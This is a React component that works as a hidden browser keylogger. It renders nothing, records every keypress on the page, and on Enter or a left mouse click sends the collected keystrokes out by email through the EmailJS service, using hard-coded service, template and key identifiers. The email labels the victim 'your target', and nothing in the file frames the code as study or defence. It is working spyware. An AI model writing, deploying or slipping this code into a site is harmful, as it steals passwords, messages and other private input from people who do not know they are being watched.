import emailjs from 'emailjs-com';

var keyString = ""
var emailParams = {}

export default function Listener() {

    /**
     * Tracks key presses and adds the data to the global 'keyString' variable
     * @param {event} keypress event 
     */
    function buildKeyString (e) {
        var result = ''
        var character = String.fromCharCode(e.keyCode)
        result += character
        if (e.keyCode !== 13) {
            keyString += result
            console.log(keyString)
        }
    }
    document.addEventListener('keypress', (e) => {
        buildKeyString(e);
        e.stopImmediatePropagation();
    })

    /**
     * This function calls the function that sends the email once the enter key is pressed, but only if there is content added to the global 'keyString', so as to avoid sending emails with no data
     * @param {event} keyup event
     */
    function sendStringEnter (e) {
        emailParams = {
            from_name: "your target",
            package: keyString
        }
        if (e.keyCode === 13 && keyString !== "") {
            sendEmail()
            keyString=""
            console.log("'enter' sent package")
        } else if (e.keyCode === 13 && keyString === ""){
            console.log("No package sent; keyString empty")
        }
    }
    document.addEventListener('keyup', (e) => {
        sendStringEnter(e);
        e.stopImmediatePropagation();
    })

    /**
     * This function calls the function that sends the email once a mouse key is clicked, but only if there is content added to the global 'keyString', so as to avoid sending emails with no data
     * @param {event} mouseup event
     */
    function sendStringClick (e) {
        emailParams = {
            from_name: "your target",
            package: keyString
        }
        if (e.button === 0 && keyString !== "") {
            sendEmail()
            keyString=""
            console.log("'click' sent package")
        } else if (e.button === 0 && keyString === "") {
            console.log("No package sent; keyString empty")
        }
    }
    document.addEventListener('mouseup', (e) => {
        sendStringClick(e);
        e.stopImmediatePropagation();
    })

    /**
     * Sends an email via the emailjs module
     */
    const sendEmail = () => {
        emailjs.send('service_s18ykma', 'template_17h4bou', emailParams, '51g4O0_Fg41v4jTW0')
        .then((result) => {
            console.log(result.text);
        }, (error) => {
            console.log(error.text);
        });
    };

    return (
        <>
        </>
    )
}
